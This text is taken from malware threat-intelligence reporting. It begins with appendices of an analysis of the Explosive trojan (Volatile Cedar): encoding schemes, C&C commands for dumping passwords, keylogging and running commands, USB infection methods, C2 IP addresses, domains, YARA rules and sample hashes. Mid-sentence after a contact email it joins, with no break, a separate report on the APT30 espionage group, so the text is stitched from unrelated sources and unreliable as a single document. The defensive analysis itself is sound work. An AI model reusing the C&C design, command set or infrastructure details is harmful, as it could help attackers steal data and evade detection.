All Table 6 - Configuration parameters OBFUSCATION Explosive uses custom obfuscation techniques to encode configuration values, C&C communication, and C&C updating protocols. The obfuscation algorithm is not very advanced and does not attempt to merge the obfuscated data into its surroundings. The primary motivation for this obfuscation appears to be to avoid detection by automated security tools such as antivirus or IPS engines. CONFIGURATION ENCODING Both the configuration and C&C updating data use a custom ASCII encoding algorithm in which each plaintext character is transformed into its hex ASCII value equivalent and separated by a ‘@’ sign. For example, the configuration value: “50@49@50@46@49@55@57@46@49@56@48@46@49@50@51@” is decoded into the plaintext string: “212.179.180.123”. The following Python code can be used to encode\decode the configuration strings: Figure 4 - Configuration parameter decoding COMMUNICATION ENCODING Starting from Version 2, C&C network traffic is encoded using a custom algorithm. To encode the data, the plaintext bytecode is reversed, base64 encoded, and reversed again. Figure 5 - Communication encoding scheme COMMUNICATION Explosive's communication algorithm is very complex and contains many, often unnecessary, branches and loops. A hardcoded C&C IP address in embedded in Explosive's main module.
Explosive initially attempts to connect to this preset C&C address. If the C&C server is nonresponsive, the hardcoded static updater server is contacted to obtain an updated C&C address. If the static updater is also nonresponsive, a custom DGA algorithm is used to produce a “dynamic updater” domain name, which is a secondary C&C updater server. This server has the same functionality as the static server, with the exception of its operating URI. The only DGA initial value we observed in our obtained samples was ‘redotntexplore’. Figure 6 - Explosive C&C Communication Schema C&C COMMUNICATION The C&C communication is performed using raw TCP sockets and encoded1
using the previously mentioned communication encoding scheme. Once the Explosive module successfully initiates communication with its C&C server, it sends an authentication password and additional data identifying the infected target. Figure 7 - Initial C&C Request (Encoded) 1. With the exception of Explosive version 1 which does not encode its C&C traffic. Figure 8 – Initial C&C Request (Decoded) As seen in Figure 8, the initial C&C request contains the following information: Parameter Description Password A fixed (encoded) password field.
This value remains the same for all analyzed Explosive versions. The decoded password value is: <*`1Q2W3E4r1’*> Identifier A value identifying the specific Explosive version and port. Client External IP The IP of the gateway connecting this IP to the Internet. This value is extracted from a query to “whatismyip2.somee.com” or “api.externalip. net” that takes place just before the initial C&C communication. If both of the “what-is-my-ip” services are not available, a custom service with similar functionality located at the C&C server over TCP/8084 is connected. If all queries fail, this value is set to “0.0.0.0” (or local IP in some versions) Username\PID The current logged in username and process ID. Hostname The infected host name. System Name The running OS, retrieved from the ‘systeminfo’ CLI command output. Installation path Current executable full path and file name. Table 7 - Information sent during initial C&C communication Next, the C&C server responds with a confirmation message, followed by an optional list of commands for the Explosive module. The confirmation message always starts with the encoded string ‘<!*connectok*!>’. Figure 9 - C&C <!*connectok*!> Response Listed below are a subset of Explosive C&C commands and their description (for the complete list, please see Appendix E) : Decoded C&C Command Description *DumpHist* Dump IE history. *DumpPass* Dump saved passwords. *GetRegValue* Get a specified registry value. *ListProcess* List all running processes. *RunCmd* Run a specified command line. *GetFile* Send a specific file to the C&C server. *UnZip*< Decompress a specified file to folder. *DeleteFiles*< Delete specified files. *GetDrivesFolder*< Get the content of a specific folder. <!*KILL*!> Kill Explosive process. <!*RERUN*!> Restart Explosive process. <!*DEL*!> Kill Explosive process and remove all traces. Table 8 – Subset of Explosive C&C commands As both the Explosive C&C requests and responses use raw TCP sockets and start with the same static ‘message delimiter’ parameter, traffic containing the TCP payload starting with the string ‘==gKg5XI+BmK’ can be used as a network indicator for Explosive C&C communication. STATIC\DYNAMIC UPDATERS The static updater is installed on a single web server, and its URL is hardcoded into the Explosive configuration section.
To disguise the server, the server's default (root) web page is a ripped HTML page from a random Internet site with all links and functionality redirecting to the original site. Once the Explosive client generates a GET request to a specific URI, a custom HTTP response is returned with a unique identifier, and the IP address and port of the new C&C server. Figure 10 - Static C&C Updater Request As opposed to the static updater, the dynamic updater does not contain a hardcoded address value in the configuration section. Instead, it uses an initial value as an input argument for a custom DGA algorithm to produce the server address. The same routine used by the static updater for updating the C&C data is used on each DGA algorithm result until a verified answer is received. Once this occurs, the DGA algorithm terminates and the current updater is set as the new static updater server. The resulting address from the DGA algorithm can be one of 170 possible permutations of the initial value. Figure 11 - Dynamic C&C updater DGA algorithm Several indicators can be used to identify all Explosive HTTP communications: 1.
The same user agent value is used in all HTTP requests. This user agent is hardcoded into the Explosive DLL binaries, and does not seem to be valid or used by any legitimate application. “Mozilla/4.0 (compatible; MSIE 7.0; MSIE 6.0; Windows NT 5.1; .NET CLR 2.0.50727)” 2. All GET requests are made to a URI starting with an uncommon double slash value. “GET //v2/443/index.php?win=4” CONNECTIVITY CHECKS Connectivity checks are made at several stages of the malware communication algorithm. Explosive attempts to connect to several well-known sites to verify if the infected host is connected to the Internet. For reasons not yet fully understood, the results of these checks are completely disregarded, and the communication algorithm continues normally regardless. The list of sites checked for connectivity is slightly different in various versions of Explosive. The latest version contains the following sites: microsoft.com maktoob.yahoo.com bing.com google.com APPENDIX A – MICRO Micro is a rare Explosive version.
It can best be described as a completely different version of the Trojan, with similarities to the rest of Explosive “family” (such as configuration and code base). We believe that Micro is actually an old ancestor of Explosive, from which all other versions were developed. As in other versions, this version is also dependent on a self-developed DLL named “wnhelp.dll.” Micro shares the same DGA algorithm as the other versions of Explosive and therefore has the same dynamic update server infrastructure. This version, however, uses the dynamic server infrastructure as its C&C server; it connects to a dedicated URI and uses different PHP parameters. http://exloreredotnt.info/micro/data/index.php?micro=4 Table 9 – Example of a Micro version URL Micro has a small configuration (also stored encoded) which uses the same encoding scheme and is located at the binary file overlay. Table 10 - Micro version configuration values C&C commands are sent via the PHP page.
The Micro process parses these commands and runs the appropriate function. A file named ‘prdata.sys’ contains information about the infected host such as the MAC address, computer name and user name. Another file ‘sdata.sys’, located in the same folder, contains the last C&C server active path. Both of these files are stored encoded. Micro also creates two other temporary files, ‘systmp.dat’ and ‘systmp2.dat’, in the %temp% folder. Micro uses the same hardcoded User-Agent value as the other versions, and uses the same command line arguments ‘-i’ and ‘-d’ to install as service and kill the malware, respectively. APPENDIX B – REMOVABLE MEDIA INFECTION Explosive has integrated functionality to enable USB and other mass storage device infection. The functionality can be enabled or disabled by setting the DLD-USI flag in the configuration section. When enabled, an additional configuration option, DLD-USA, dictates the specific infection method. The possible infection methods are: Autorun.exe – Explosive copies itself into the USB root directory and changes the filename to ‘autorun.exe.’ Autorun.inf – This is the same as the ‘autorun.exe’ option, but with an additional ‘autorun.inf’ file copied into the same directory. EXE infection – Explosive scans all *.exe files located in the USB drive, looking for previous infections.
Previous infections are located by using the Exported PathProcess function from the Explosive DLL. If no previous infections were found, Explosive copies each *.exe file into the system’s temporary folder (%temp%) and adds both the Explosive EXE and DLL files to its binary data To extract the injected files, a “Loader” binary is then injected into the file's binary. This “Loader” is set to be the main executable module. Once the injected file is executed, the “Loader” code is used to extract the Explosive files and resume the functionality of the original file. After the infection is complete, all infected files are returned to the USB drive and overwrite the original file. A special string “^!#^~|” is used by the “Loader” to parse and run the executable file. All – Uses all of the listed options. APPENDIX C – INDICATORS OF COMPROMISE Host Based IOCs Service Names Explosive can be installed with the following service names.
The service is usually installed with no description value. Possible Explosive Service Names Helper WindowsHelper VMWareActivationHelper WindowsInet WindowsHelpService WindowsHelpServices WindowsInetService MicrosoftIserv MicrosoftServices MicrosoftSystemClock Main Module Filenames These are the possible main Explosive modules filenames: Possible Main Module Filenames aqagent.exe vsmss.exe qsagent.exe w3wp.exe cvsc.exe whelp.exe dllhost.exe whttpd.exe dllvhost.exe winet.exe dwcm.exe winhelp.exe embedded.exe winhlp.exe ieservice.exe winhttpd.exe logsys.exe wininet.exe nsp.exe winlog.exe rundll32.exe winscr.exe sccsc.exe winscrv.exe svchost.exe winserv.exe svsc.exe wisrv.exe svskey.exe wnhelp.exe syslog.exe wnsys.exe syswin.exe wshelp.exe updater.exe wvsys.exe vmacthlpsrv.exe whelp.exe vmtools.exe whttpd.exe vmtoolsd.exe DLL Filenames These are the possible Explosive DLL filenames and the versions in which they appear: Possible DLL filenames Explosive Version vsystem.dll Version 3 winsec.dll Version 2 tools.dll Version 1 serverhelp.dll KS version wnhelp.dll Micro version Installation Paths Explosive variants are installed and run under the following paths: Possible Working Paths %systemroot% %systemroot%\system32 %systemroot%\SysWOW64 %appdata% %programfiles%\VMware\VMware Tools %programfiles%\VMWare\VMware Tools\win32 %programfiles%\Notepad++ Additional Paths During its operation, Explosive uses several other files and directories for various tasks such as storing keylog data and other information extracted from the victim’s system.
The existence of these files and paths in a system can be used as an indicator of compromise. These files and paths are most commonly set with “system” and “hidden” attributes. Filename\Path %systemroot%\Microsoft Help\Secure %systemroot%\Microsoft Help\Secure\[username].tp.dat %systemroot%\Microsoft Help\Secure\[username].tc.dat %systemroot%\Microsoft Help\Secure\wintp\ %systemroot%\Microsoft Help\Secure\wintc\ %systemroot%\Microsoft Help\Secure\wintp\[username]-[date.time].dat %systemroot%\Microsoft Help\Secure\wintc\[username]-[date.time].dat c:\recycler\Microsoft Help\Secure c:\recycler\Microsoft Help\Secure\[username].tp.dat c:\recycler\Microsoft Help\Secure\[username].tc.dat c:\recycler\Microsoft Help\Secure\wintp\ c:\recycler\Microsoft Help\Secure\wintc\ c:\recycler\Microsoft Help\Secure\wintp\[username]-[date.time].dat c:\recycler\Microsoft Help\Secure\wintc\[username]-[date.time].dat [CurrentRunningFolder]\[username]-rpt.sys [CurrentRunningFolder]\[username]-crpt.sys [CurrentRunningFolder]\winrpt [CurrentRunningFolder]\wincrpt [CurrentRunningFolder]\winrpt\[username]-[date.time].sys [CurrentRunningFolder]\wincrpt\[username]-[date.time].sys Network Based IOCs C&C Updater Paths Several URIs are used by both the dynamic and static C&C update servers. These are the observed values: Possible C&C Updater URIs /ex/ie.php /v2/p5/80/index.php /445/ie.php /v2/p5/443/index.php /microsoft/ie.php /v2/p5/445/index.php /microsoft/index.php /v2/p3/80/index.php /80/index.php /v2/p3/443/index.php /443/index.php /v2/p3/445/index.php /445/index.php /v3/80/index.php /v2/443/index.php /v3/443/index.php /v2/445.index.php /v3/445/index.php C&C TCP Values The detection of the following strings at the beginning of the TCP payload indicates a connection with the Explosive C&C server: TCP Payload Starts With Version ==gKg5XI+BmK Version 2 and 3 (communication to and from the C&C server) <*`!Q@W#E4’*> Version 1 (communication to the C&C server) <’|’>Explosive Version 1 (communication to the C&C server) HTTP Values The C&C static and dynamic updaters both use HTTP for communication.
While some of the following indicators are more common than others, they can all be used to detect Explosive C&C update communication: HTTP Field Value User Agent Mozilla/4.0 (compatible; MSIE 7.0; MSIE 6.0; Windows NT 5.1; .NET CLR 2.0.50727) URL Contains php?win=1 URL Contains php?win=4 URL Contains Php?micro= Server Infrastructure C&C Servers These C&C server addresses are hardcoded in the various Explosive binaries: IP Address Geographical Location 69.64.90.94 USA 50.60.129.74 USA 85.25.20.27 Germany 213.204.122.130 Lebanon 213.204.122.133 Lebanon 184.107.97.188 Canada 69.94.157.80 USA Static and Dynamic C&C Updater Servers These domain names are used by the static C&C updater servers: IP Address Registered Info saveweb.wink.ws GoDaddy carima2012.site90.com GoDaddy explorerdotnt.info N/A dotnetexplorer.info Cloud Group Limited dotntexplorere.info Fastdomain inc. xploreredotnet.info N/A erdotntexplore.info Fastdomain inc. SSH Server List These IP addresses were detected as PLink servers used by the attacker for the SSH tunnel destinations: IP Address Geo Location 69.94.157.80 USA 50.60.129.78 USA APPENDIX D – SCRIPTS AND SIGNATURES Dynamic C&C Updater DGA Algorithm The following Python script can be used to generate the results of the dynamic C&C updater DGA algorithm: These YARA signatures can be used to detect all versions of Explosive EXE and DLL files: rule explosive_exe {
meta:
author = “Check Point Software Technologies Inc.”
info = “Explosive EXE”
strings:
$MZ = “MZ”
$DLD_S = “DLD-S:”
$DLD_E = “DLD-E:”
condition:
$MZ at 0 and all of them } 20 import “pe” rule explosive_dll {
meta:
author = “Check Point Software Technologies Inc.”
info = “Explosive DLL”
condition:
pe.DLL
and ( pe.exports(“PathProcess”) or pe.exports(“_PathProcess@4”) ) and pe.exports(“CON”) } APPENDIX E – OTHER INFORMATION Complete List of C&C Commands: The following is a complete list of the available C&C commands: Encoded Command Decoded Command Description '==gKg5XI+BmKqwUazRHUy92YlN3c' ListProcess List all running processes. ==gKg5XI+BmKqsUasxGUy92YlN3c KillProcess Kill a specified process. ==gKg5XI+BmKqIVduNUbkpCf RunCmd Run a specified command line. ==gKg5XI+BmK==gKF5WdttUZ5NnK *EnumKeys* Get the registry keys under a specified path. ==gKg5XI+BmK=oSRuVXbS92b0tUZ5NnK *EnumRootKeys* Get root registry keys. ==gKg5XI+BmK==gKHVGdSV2ZWFGb1VmK GetRegValue* Get a specified registry value. ==gKg5XI+BmKqQVZs5WZ0pCP *`~!~`**Telnet*< Connect remotely. ==gKg5XI+BmKqEEZkRUaypCP *AddDir*< Create a specified directory. ==gKg5XI+BmKqQUZsRUaypCP *DelDir* Delete a specified directory. ==gKg5XI+BmK==gKHVGdEJXa2V2cG9GbkVmc *GetDrivesFolder Get the content of a specific folder. ==gKg5XI+BmKqcUZ0RkcpZXZzpCP *GetDrives*< Get the drive list. ==gKg5XI+BmKqcUZ0ZUasVmK `**GetFile* Send a specific file to C&C server. ==gKg5XI+BmK=oyUjNFavRnK *ScShot* Get a screenshot. ==gKg5XI+BmK==gKEVXbwBVYzNnK *DumpPass* Dump saved passwords. ==gKg5XI+BmK==gKEVXbwhUazRnK *DumpHist* Dump IE history. ==gKg5XI+BmK=oySllHTvdmK *KeyLog* Get latest key logging file content. ==gKg5XI+BmK=oyQslGci9WYyRGTvdmK *ClipboardLog* Get latest clipboard logging file content. ==gKg5XI+BmK==gKF5WdtdVauR2b3NnK *EnumWindows* List open windows. ==gKg5XI+BmK=oCRlxWZ0VmRpxWZzpCP *DeleteFiles* Delete specified files. ==gKg5XI+BmK=oyQvBXeQF2c0VmRpxWZzpCP *CopyPasteFiles* Copy and paste specified files. ==gKg5XI+BmK==gKDVHdQF2c0VmRpxWZzpCP *CutPasteFiles* Cut and paste specified files. ==gKg5XI+BmKqoVawpCP *Zip*< Compress a specified file. ==gKg5XI+BmK=oSVupVawpCP *UnZip* Decompress a specified file to folder. ==gKg5XI+BmKqwUazRHUy92YlN3c ListProcess List all running processes. ==gKg5XI+BmKq8Ecl5GUGpyW OpenPF Open a specified file. ==gKg5XI+BmK==gKqMEbvNXZGlGblpiK *CloseFile* Close a specified file. ==gKg5XI+BmK=oiRpxWZTVmbkpCP *FileSend*< Send a specified file. '==gKg5XI+BmK=wTIqIVRSVlTqEiP <!*RERUN*!> Restart Explosive process. ==gKg5XI+BmK==APhoySJxETqEiP <!*KILL*!> Kill Explosive process. ==gKg5XI+BmK8EiKEVETqEiP *<!*DEL*!> Kill Explosive process and remove all traces. ==gKg5XI+BmK8oCYF9kRgpiP <*`EOF`*> End of transmitted file. ==gKg5XI+BmK=wTlqaqEiP <!*ok*!> Confirm receipt of data. Table 11 - Complete list of C&C commands APPENDIX F – WEB SHELLS The web shells injected into the compromised web servers are mostly custom made.
They are written in various languages, such as ASP, ASP.Net and PHP. These web shells contain many capabilities and have been seen to be heavily used by the attacker throughout the attack lifetime. Some of the web-shells functionalities are: Run remote commands Upload\Download files Account brute forcing Registry Access The most common web shell used by the attackers is the Caterpillar web shell (name taken from the web shell code) which is a variant of the AspxSpy web shell. Other web shells have also been used in the Volatile Cedar campaign, such as the KIDO web shell. These are the filenames and hashes of the detected web shells: File Name MD5 Hash 404.asp 44db62acf787be73dcf8968d360f32b8 404.aspx 9f98eb473d3723f09d6a94cb326d4984 caterpillar.aspx dab2cbb34ec587587bdf0418f7fb06b1 Heblib140201.aspx d028eacd721e0b2d6e9ce19d2575d51b APPENDIX G – SAMPLE HASHES These sample hashes were seen during our analysis of the campaign: MD5 Hash eb7042ad32f41c0e577b5b504c7558ea 44b5a3af895f31e22f6bc4eb66bd3eb7 08c988d6cebdd55f3b123f2d9d5507a6 61b11b9e6baae4f764722a808119ed0c c7ac6193245b76cc8cebc2835ee13532 184320a057e455555e3be22e67663722 5d437eb2a22ec8f37139788f2087d45d 1dcac3178a1b85d5179ce75eace04d10 9a5a99def615966ea05e3067057d6b37 2b9106e8df3aa98c3654a4e0733d83e7 ab3d0c748ced69557f78b7071879e50a c9a4317f1002fefcc7a250c3d76d4b01 4f8b989bc424a39649805b5b93318295 3f35c97e9e87472030b84ae1bc932ffc 7cd87c4976f1b34a0b060a23faddbd19 22 ea53e618432ca0c823fafc06dc60b726 034e4c62965f8d5dd5d5a2ce34a53ba9 5ca3ac2949022e5c77335f7e228db1d8 306d243745ba53d09353b3b722d471b8 e6f874b7629b11a2f5ed3cc2c123f8b6 5b505d0286378efcca4df38ed4a26c90 7dbc46559efafe8ec8446b836129598c 1d4b0fc476b7d20f1ef590bcaa78dc5d 66e2adf710261e925db588b5fac98ad8 c898aed0ab4173cc3ac7d4849d06e7fa 22872f40f5aad3354bbf641fe90f2fd6 c19e91a91a2fa55e869c42a70da9a506 740c47c663f5205365ae9fb08adfb127 edaca6fb1896a120237b2ce13f6bc3e6 d2074d6273f41c34e8ba370aa9af46ad 6f11a67803e1299a22c77c8e24072b82 7031426fb851e93965a72902842b7c2c 981234d969a4c5e6edea50df009efedd 2783cee3aac144175fef308fc768ea63 f58f03121eed899290ed70f4d19af307 96b1221ba725f1aaeaaa63f63cf04092 29eca6286a01c0b684f7d5f0bfe0c0e6 826b772c81f41505f96fc18e666b1acd APPENDIX H – CHECK POINT DETECTION NAMES Name Trojan.Win32.Explosive Trojan.Win32.Explosive.A Trojan.Win32.Explosive.B Trojan.Win32.Explosive.C ADDITIONAL INFORMATION The information in this report is based on partial visibility and evidence collected during our investigation. The Volatile Cedar investigation is still ongoing.
We hope to release further information in upcoming reports. If you suspect you were targeted by this campaign, or can share additional information on this campaign based on other meaningful observations please contact volatilecedar@checkpoint.comour singapore-based fireeye labs team examined malware aimed predominantly at entities in Southeast Asia and India, we suspected that we were peering into a regionally focused cyber espionage operation. The malware revealed a decade-long operation focused on targets—government and commercial—who hold key political, economic, and military information about the region. This group, who we call APT30, stands out not only for their sustained activity and regional focus, but also for their continued success despite maintaining relatively consistent tools, tactics, and infrastructure since at least 2005. In essence, our analysis of APT30 illuminates how a group can persistently compromise entities across an entire region and subcontinent, unabated, with little to no need to significantly change their modus operandi. Based on our malware research, we are able to assess how the team behind APT30 works: they prioritize their targets, most likely work in shifts in a collaborative environment, and build malware from a coherent development plan.
Their missions focus on acquiring sensitive data from a variety of targets, which possibly include classified government networks and other networks inaccessible from a standard Internet connection. While APT30 is certainly not the only group to build functionality to infect air-gapped networks into their operations, they appear to have made this a consideration at the very beginning of their development efforts in 2005, significantly earlier than many other advanced groups we track. Such a sustained, planned development effort, coupled with the group’s regional targets and mission, lead us to believe that this activity is state sponsored—most likely by the Chinese government. Rather than focus on the potential sponsorship of this activity, this report seeks to thoroughly analyze the development effort of one of the longest-running advanced threat groups we’ve observed. APT30 and the Mechanics of a Long-Running Cyber Espionage Operation APT30 is noted for sustained activity, but also for successfully maintaining the same tools, tactics, and infrastructure since at least 2005.
KEY FINDINGS APT30’s development and refinement of a set of integrated tools, as well as their re-use of infrastructure over a period of 10 years, suggests a consistent long-term mission. This suite of tools includes downloaders, backdoors, a central controller, and several components designed to infect removable drives and cross air-gapped networks to steal data. APT30 frequently registers their own DNS domains for use with malware command and control (C2). Based on their presence in malware samples, some of the domains have been in use for many years. APT30 has a structured and organized workflow, illustrative of a collaborative team environment, and their malware reflects a coherent development approach.
The group (or the developers supporting them) systematically labels and keeps track of their malware versioning. The malware uses mutexes and events to ensure only a single copy is running at any given time, and the malware version information is embedded within the binary. Malware C2 communications include a version check that allows the malware to update itself to the latest copy, providing a continuous update management capability. The controller software for APT30’s BACKSPACe backdoor (also known as “Lecna”) suggests the threat actors prioritize targets and may work on shifts. APT30 backdoors commonly use a twostage C2 process, where victim hosts contact an initial C2 server to determine whether they should connect to the attackers’ main controller.
The controller itself uses a GUI that allows operators to prioritize hosts, add notes to victims, and set alerts for when certain hosts come online. Finally, an unused dialog box in the controller provides a login prompt for the current “attendant.” The group’s primary goal appears to be sensitive information theft for government espionage. APT30 malware includes the ability to steal information (such as specific file types), including, in some cases, the ability to infect removable drives with the potential to jump air gaps. Some malware includes commands to allow it to be placed in “hide” mode and to remain stealthy on the victim host, presumably for long-term persistence. APT30 predominantly targets entities that may satisfy governmental intelligence collection requirements.
The vast majority of APT30’s victims are in Southeast Asia. Much of their social engineering efforts suggest the group is particularly interested in regional political, military, and economic issues, disputed territories, and media organizations and journalists who report on topics pertaining to China and the government’s legitimacy. India South Korea Malaysia Vietnam Nepal Bhutan Philippines Singapore Indonesia Brunei Myanmar Laos Cambodia Japan Thailand Saudi Arabia United States  Our analysis of APT30’s malware and domain registration data shows the group has been operating for over a decade. The earliest-known registration dates for domains attributed to APT30 go back to 2004, and the compile times for APT30 malware using those domains for C2 date back to 2005.1 Typically, threat groups who register domains for malicious use will abandon them after a few years. APT30, however, has used some of their domains for more than five years, with some of their earliest domains still in use as of at least late 2014.
For example, one of the earliest known BACKSPACE malware samples (md5 hash b2138a57f723326eda5a26d2dec56851) was compiled onMarch 11, 2005 at 00:44:47. The sample used the domain www.km-nyc[.] com as its primary C2 location. That domain was still in use as a secondary C2 domain in a BACKSPACE sample compiled as recently as November 5, 2014 05:57:26 (md5 hash 38a61bbc26af6492fc1957ac9b05e435). For such a long operational history, APT30 appears to have conducted their activity using a surprisingly limited number of tools and backdoors. One reason for this might be that they have had no need to diversify or add to their arsenal if they have been successful with their current approach.
Although APT30 has used a variety of secondary or supporting tools over the years (such as droppers and downloaders used to deploy APT30’s primary backdoors), their primary tools have remained remarkably consistent over time: namely, the backdoors BACKSPACE and NETEAGLE, and a set of tools (SHIPSHAPE, SPACESHIP, and FLASHFLOOD) believed to be designed to infect (and steal data from) air-gapped networks via infected removable drives. Where some threat groups might exchange one backdoor for another as newer, more flexible, or more feature-rich tools become available, APT30 has chosen to invest in the long-term refinement and development of what appear to be a dedicated set of tools. This suggests that APT30 (or the developers providing them with tools) has the ability to modify and adapt their source code to suit their current needs or their target environment. The earliest variants of the BACKSPACE backdoor date to at least 2005, and versions of the backdoor remain in use today. BACKSPACE itself appears to have a flexible, modularized development framework and has been modified over time to create a wide range of variants.
FireEye has identified two main “branches” of the BACKSPACE code (“ZJ” and “ZR”), each compiled with a slightly different set of commands. In addition, while BACKSPACE has been implemented in a variety of ways (e.g., as a standalone EXE, as a DLL, as an EXE that extracts and launches a DLL at runtime) and leveraged a variety of persistence methods (e.g., via a shortcut (.lnk) file in the Startup folder, as a service DLL), the core functionality has remained largely unchanged, although some additional features have been added over time. While the NETEAGLE backdoor does not have as venerable a history (identified samples were compiled as early as 2008 and as recently as 2013), it shows a similar pattern of long-term refinement and modification, including the development of two main variants (which we call the “Scout” and “Norton” variants). Just as with BACKSPACE, while the details of implementation and specific features across NETEAGLE samples may vary, the core functionality remains the same except for the addition of features or enhancements. This dedication to adapting and modifying tools over a number of years, as opposed to discarding old tools in favor of newer, readily available ones, implies that APT30 has a long-term mission, and that their mission is consistent enough for their existing tools to be sufficient to support their operations over a long period of time.
APT30 appears to have a consistent, long-term mission that relies on existing tools to remain sufficient over time. MALWARE / TOOL COMPILE DATE–EARLY SAMPLE COMPILE DATE–RECENT SAMPLE BACKSPACE 2 January 2005 5 November 2014 NETEAGLE 20 June 2008 6 November 2013 SHIPSHAPE 22 August 2006 9 June 2014 SPACESHIP 23 August 2006 5 June 2014 FLASHFLOOD 31 January 2005 17 February 2009  In addition to APT30’s long-term use of a regular set of tools, in most cases the tools themselves – while they may vary in purpose – share a consistent set of development features. In particular, the tools all exhibit a carefully managed versioning system and a consistent method for checking version information, performing updates, and ensuring only a single copy of a given tool is running on a victim host at any time. This suggests that APT30 is dedicated to maintaining a tightly run, efficient operation. BACKSPACE, NETEAGLE, SHIPSHAPE, and SPACESHIP all maintain an internal version number and include some means to check their version number against a reference version, and attempt to automatically update the malware if its version is different than the reference number.
For some APT30 malware, we speculate that the version string may also describe additional properties of the malware. For instance, one variant of BACKSPACE (“ZRLnk”) uses a version string where the first two digits indicate the malware version number. The next character may indicate the type of icon stored in the file’s resource section and possibly the type of exploit document used to deliver the malware (for example, ‘p’ for Acrobat Reader / PDF and ‘w’ for Microsoft Word 2). Finally, the next character (‘l’) may indicate that that the malware uses a shortcut (.lnk) file to maintain persistence. 3 PROFESSIONALLY DEVELOPING TOOLS: APT30 Uses a Consistently Organized Malware Development Approach Table 1: ZRLnk version history MD5 Hash Version Compile Time Size b4ae0004094b37a40978ef06f311a75e 1.0.p.l 4 November 2010 03:51 73,728 37aee58655f5859e60ece6b249107b87 1.1.w.l 25 February 2011 02:03 32,768 8ff473bedbcc77df2c49a91167b1abeb 1.2.w.l 4 May 2011 14:46 49,152 4154548e1f8e9e7eb39d48a4cd75bcd1 1.2.w.l 4 May 2011 14:46 17,408 15304d20221a26a0e413fba4c5729645 1.2.w.l 16 May 2011 11:03 36,864 c4dec6d69d8035d481e4f2c86f580e81 1.3.w.l 26 October 2011 11:21 40,960 a813eba27b2166620bd75029cc1f04b0 1.3.p.l 28 June 2012 10:01 86,144 5b2b07a86c6982789d1d85a78ebd6c54 1.5.w.lN 8 January 2013 01:33 10,518,528 71f25831681c19ea17b2f2a84a41bbfb 1.6.w.lY 23 April 2013 08:12 57,344 6ee35da59f92f71e757d4d5b964ecf00 1.9.w.lY 28 August 2014 0 9:12 57,344  With respect to version numbers, the BACKSPACE “ZJ” variant has the longest revision history.
Our analysis of 55 ZJ samples showed versions from 1.2 through 20.50 spanning nearly eight years (from 2005 through 2012, based on compile times). Besides version control, most malware used by APT30 (to include BACKSPACE, SHIPSHAPE, SPACESHIP, and FLASHFLOOD) uses a consistent methodology (a set of mutexes and events) to manage malware execution and ensure that only a single copy of a given piece of malware is running at any one time, presumably to decrease the chances of detection. The mutexes and events are highly consistent in their naming conventions, with most containing the terms ‘Microsoft’ or ‘ZJ’ or both. The mutex is created when the malware executes, and ensures only one copy is running at a time. The events use similar naming conventions as the mutexes, and are used to signal the malware and associated threads to exit.4 The emphasis on malware versioning implies a structured and well-managed development environment.
Similarly, the close attention to ensuring only one copy of a given tool is running at a time and a well-developed, automated means of update management imply that these tools are in use by a professional team of threat actors. We can infer that the threat actors are interested in maintaining the latest and greatest versions of their tools in their victims’ environments. Likewise, the threat actors are likely operating at a sufficiently large scale that they benefit from the automated management of many of their tools. While there is no guarantee that the tools described in this paper are exclusive to APT30, we have not yet observed these tools used by any other threat groups. That the tools have evolved over time while maintaining a consistent amount of core functionality indicates that APT30 has development resources available to modify and customize their malware.
This implies either that APT30 is responsible for developing their own tools, or has a working relationship with developers able to support them in a consistent (and possibly exclusive) manner. Table 2: Mutexes and events used for process execution and version control Malware Example Mutexes / Events BACKSPACE MicrosoftZj MicrosoftExit MicrosoftHaveAck MicrosoftHaveExit BACKSPACE MicrosoftZjLnk MicrosoftExitLnk MicrosoftHaveLnkAck MicrosofthaveLnkExit SHIPSHAPE MicrosoftShipZJ MicrosoftShipExit MicrosoftShipHaveAck MicrosoftShipHaveExit SPACESHIP MicrosoftShipTrZJ MicrosoftShipTrExit MicrosoftShipTrHaveExit FLASHFLOOD MicrosoftFlashZJ MicrosoftFlashExit MicrosoftFlashHaveAck MicrosoftFlashHaveExit APT30 likely either develops their own tools or has a working relationship with developers who are able to consistently - perhaps exclusively - support them. Table 3: Example URIs used for BACKSPACE first-stage C2 URI (<path>/<file>) Function /ForZRLnk3z/hostlist.txt Validation check and list of victims to perform further actions. /some/edih.txt Switch specified victims to “hide” mode. /some/nur.txt Switch specified victims to “run” mode.
/ForZRLnk3z/bak.txt Switch to backup stage one C2 server (BACKSPACE is typically configured with main and backup first-stage C2 servers). /ForZRLnk3z/app.txt Download and execute the file. /ForZRLnk3z/myapp.txt Download and execute the file (if victim appears in hostlist.txt). /ForZRLnk3z/ver.txt Perform version check. /ForZRLnk3z/exe.txt Download and execute the file if the version check fails (self-update).
/ForZRLnk3z/SomeUpVer.txt Backup URI for version check. /ForZRLnk3z/SomeUpList.txt List of hostnames that should perform self-update if backup version check fails. /ForZRLnk3z/SomeUpExe.txt Backup URI for self-update. /ForZRLnk3z/dizhi.gif Second-stage C2 information (IP address and port(s)). /ForZRLnk3z/connect.gif List of victims to connect to second-stage C2 controller.
The BACKSPACE and NETEAGLE backdoors used by APT30 use a two-stage C2 infrastructure. The backdoors are configured with an initial (stage one) set of C2 locations, typically one or more C2 domains. Interaction with the stage one C2 is fully automated; that is, the stage one C2 does not support any interactive communication between the threat actor and the victim computer. Both BACKSPACE and NETEAGLE use HTTP requests to interact with the stage one C2, requesting URIs to download different files that are used to obtain basic instructions, information (including second stage C2 locations) or download and execute additional binaries. While victim hosts may beacon to the second stage C2 (e.g., transmit data about the victim without expectation of a response), only those victim hosts specifically instructed to do so will establish a full connection to a BACKSPACE controller.
Once the malware has connected to the controller, the threat actor can interact directly with the victim host. By using this two-stage approach, the threat actors introduce a layer of obfuscation between themselves and their victims. This also allows them to better manage their victims, particularly at scale; newly infected victims can interact with the stage one C2 servers in an automated fashion until the threat actors can review them and select particular hosts for interactive, stage two exploitation. The table below shows an example set of URIs that may be requested by the BACKSPACE sample with md5 hash 6ee35da59f92f71e757d4d5b964ecf00, and the purpose of each file.5 Full URIs are in the format of hxxp://<c2_domain>/<path>/<file>, where <c2_domain> is one of the backdoor’s specified C2 domains; <path> is a path name that typically varies across samples (/some/ or /ForZRLnk3z/ in the examples below); and <file> is the specific file requested. Suggests Target Prioritization and Shift Work Additional information about APT30’s operations can be inferred by examining the GUI controller used to manage their BACKSPACE backdoors.
